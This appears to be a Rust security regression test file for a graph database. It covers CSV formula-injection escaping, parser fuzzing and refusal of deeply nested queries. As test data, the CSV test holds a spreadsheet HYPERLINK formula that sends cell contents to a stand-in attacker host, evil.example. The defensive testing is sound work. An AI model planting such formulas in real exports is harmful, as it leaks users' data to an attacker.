//! Findings from reviewing the existing code, kept as regression tests.
#![cfg(feature = "security")]

use nexgraph::query::parser;
use nexgraph::{Database, Value};

#[test]
fn csv_export_neutralises_spreadsheet_formulas() {
    let db = Database::in_memory();
    db.query(r#"CREATE (:Note {t: '=HYPERLINK("http://evil.example/?"&A1,"x")'}), (:Note {t: '+1+1'}), (:Note {t: '-2+3'}), (:Note {t: '@SUM(A1)'}), (:Note {t: 'plain'}), (:Note {t: 'a=b'}), (:Note {n: -5})"#).unwrap();
    let r = db.query("MATCH (n:Note) RETURN n.t AS t, n.n AS n").unwrap();
    let safe = r.to_csv();
    for line in safe.lines().skip(1) {
        let first = line.trim_start_matches('"').chars().next();
        assert!(!matches!(first, Some('=' | '+' | '-' | '@')), "formula-leading cell survived: {line}");
    }
    assert!(safe.contains("'=HYPERLINK") && safe.contains("'+1+1") && safe.contains("'@SUM") && safe.contains("a=b") && safe.contains("plain"));
    assert!(safe.contains(",-5"), "a real negative number must stay a number");
    // the raw writer is unchanged for pipelines that need exact text
    assert!(r.to_csv_raw().contains("\n=HYPERLINK") || r.to_csv_raw().contains("\"=HYPERLINK"));
    // BI tables and column aliases go through the same writer
    let evil = db.query(r#"MATCH (n:Note) RETURN n.t AS `=cmd` LIMIT 1"#);
    if let Ok(e) = evil {
        assert!(e.to_csv().starts_with("'=cmd"));
    }
}

/// A deterministic mutation fuzz: whatever bytes a client sends, parsing must return an error, not panic.
#[test]
fn parser_never_panics_on_mutated_statements() {
    let seeds = [
        "MATCH (s:Stay)-[r:T*1..3]->(b) WHERE s.age > 50 AND NOT s.x IS NULL RETURN s.gender AS g, count(*) AS n ORDER BY n DESC SKIP 1 LIMIT 5",
        "CREATE (:A {x: 1, y: 'z'}), (:B {w: [1,2,3]})",
        "MATCH (a) SET a.k = a.j + 1 DELETE a",
        "CALL uw.scorecard('Loan', 'default', 'a,b', 'id') YIELD term RETURN term",
        "AS OF 3 MATCH ()-[e]-() RETURN e",
        "CREATE INDEX ON :Stay(age)",
    ];
    let alphabet: Vec<char> = "()[]{}<>-:,.'\"`$*|=!+/\\ \n\tMATCHRETURNWHEREAND0123456789é\u{0}".chars().collect();
    let mut x: u64 = 0x9E3779B97F4A7C15;
    let mut next = move || {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        x
    };
    let mut parsed_ok = 0;
    for i in 0..30_000 {
        let mut s: Vec<char> = seeds[i % seeds.len()].chars().collect();
        for _ in 0..(1 + next() % 6) {
            let at = (next() as usize) % (s.len() + 1);
            match next() % 3 {
                0 if at < s.len() => {
                    s.remove(at);
                }
                1 => s.insert(at, alphabet[(next() as usize) % alphabet.len()]),
                _ if at < s.len() => s[at] = alphabet[(next() as usize) % alphabet.len()],
                _ => {}
            }
        }
        let text: String = s.into_iter().collect();
        let r = std::panic::catch_unwind(|| parser::parse(&text).is_ok());
        match r {
            Ok(ok) => parsed_ok += ok as usize,
            Err(_) => panic!("parser panicked on {text:?}"),
        }
    }
    assert!(parsed_ok > 100, "the fuzz should still reach valid statements ({parsed_ok})");
}

/// Deeply nested input must be refused, not overflow the stack (which would abort the whole server process).
#[test]
fn deeply_nested_statements_do_not_crash_the_process() {
    let h = std::thread::Builder::new()
        .stack_size(2 * 1024 * 1024)
        .spawn(|| {
            let long = |op: &str| format!("RETURN 1{}", format!("{op}1").repeat(30_000));
            for q in [long("+"), long(" AND "), long(" OR "), long("*"), long("."), format!("MATCH {} RETURN a", "(a)-[]->".repeat(5_000) + "(z)"), format!("RETURN {}", "f(".repeat(20_000) + &")".repeat(20_000))] {
                assert!(parser::parse(&q).is_err(), "accepted: {:?}", &q[..30]);
            }
            for depth in [1_000usize, 10_000, 30_000] {
                let e = format!("MATCH (n) WHERE {}n.x = 1{} RETURN n", "(".repeat(depth), ")".repeat(depth));
                assert!(parser::parse(&e).is_err(), "nested {depth} deep must be refused");
                let l = format!("RETURN {}1{}", "[".repeat(depth), "]".repeat(depth));
                let _ = parser::parse(&l);
                let n = format!("RETURN {}1", "-".repeat(depth));
                let _ = parser::parse(&n);
                let not = format!("MATCH (n) WHERE {}true RETURN n", "NOT ".repeat(depth));
                let _ = parser::parse(&not);
            }
            Value::Null
        })
        .unwrap();
    h.join().expect("parser overflowed its stack on nested input");
}

#[test]
fn ordinary_deep_but_reasonable_queries_still_parse() {
    let q = format!("MATCH (n) WHERE {} RETURN n", (0..200).map(|i| format!("n.p{i} = {i}")).collect::<Vec<_>>().join(" OR "));
    assert!(parser::parse(&q).is_ok());
    assert!(parser::parse("MATCH (n) WHERE ((((((((n.a > 1)))))))) AND NOT (n.b IS NULL) RETURN -(-n.a + 2) * 3").is_ok());
    assert!(parser::parse(&format!("RETURN [{}]", (0..500).map(|i| i.to_string()).collect::<Vec<_>>().join(","))).is_ok());
}
